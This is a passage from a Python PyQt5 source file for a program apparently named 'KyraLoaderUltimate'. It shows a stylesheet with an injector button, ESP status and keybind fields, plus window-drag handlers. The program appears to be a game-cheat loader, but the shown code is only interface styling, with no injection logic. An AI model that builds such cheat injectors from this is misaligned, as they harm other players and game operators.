                background-color: {self.kyra_purple.name()};
            }}
            
            #comboBox {{
                background: {self.panel_dark.lighter(110).name()};
                color: {self.text_light.name()};
                border: 1px solid {self.kyra_purple.name()};
                padding: 4px;
                border-radius: 3px;
                min-width: 100px;
                font-size: 12px;
            }}
            
            #keybindInput, #colorInput {{
                background: {self.panel_dark.lighter(110).name()};
                color: {self.text_light.name()};
                border: 1px solid {self.kyra_purple.name()};
                padding: 4px;
                border-radius: 3px;
                selection-background-color: {self.kyra_purple.name()};
                font-size: 12px;
            }}
            
            #saveButton {{
                background-color: {self.kyra_purple.name()};
                color: white;
                border: none;
                border-radius: 4px;
                font-weight: bold;
                font-size: 13px;
            }}
            
            #saveButton:hover {{
                background-color: {self.kyra_purple_light.name()};
            }}
            
            /* Injector Styles */
            #injectButton {{
                background-color: {self.kyra_purple.name()};
                color: white;
                border: none;
                border-radius: 4px;
                font-size: 14px;
                font-weight: bold;
            }}
            
            #injectButton:hover {{
                background-color: {self.kyra_purple_light.name()};
            }}
            
            /* Slider Styles */
            #sliderLabel {{
                color: {self.text_light.name()};
                font-size: 12px;
            }}
            
            #sliderValue {{
                color: {self.text_light.name()};
                font-size: 12px;
            }}
            
            QSlider::groove:horizontal {{
                height: 3px;
                background: {self.panel_dark.lighter(120).name()};
                border-radius: 1px;
            }}
            
            QSlider::handle:horizontal {{
                background: {self.kyra_purple.name()};
                width: 12px;
                margin: -4px 0;
                border-radius: 6px;
            }}
            
            /* Model Panel Styles */
            #modelPanel, #previewPanel {{
                background-color: {self.panel_dark.name()};
                border: 1px solid {self.kyra_purple.name()};
                border-radius: 6px;
                padding: 12px;
            }}
            
            #modelStatus, #espStatus {{
                color: {self.kyra_purple_light.name()};
                font-size: 12px;
                margin-top: 8px;
            }}
            
            #previewLabel {{
                color: {self.kyra_purple_light.name()};
                font-size: 14px;
                font-weight: bold;
                padding-bottom: 4px;
                border-bottom: 1px solid {self.kyra_purple.name()};
            }}
            
            /* General text styling */
            QLabel {{
                color: {self.text_light.name()};
            }}
        """)

    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self.drag_pos = event.globalPos()

    def mouseMoveEvent(self, event):
        if event.buttons() == Qt.LeftButton and hasattr(self, 'drag_pos'):
            self.move(self.pos() + event.globalPos() - self.drag_pos)
            self.drag_pos = event.globalPos()

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setFont(QFont("Segoe UI", 9))
    window = KyraLoaderUltimate()
    window.show()
    sys.exit(app.exec_())
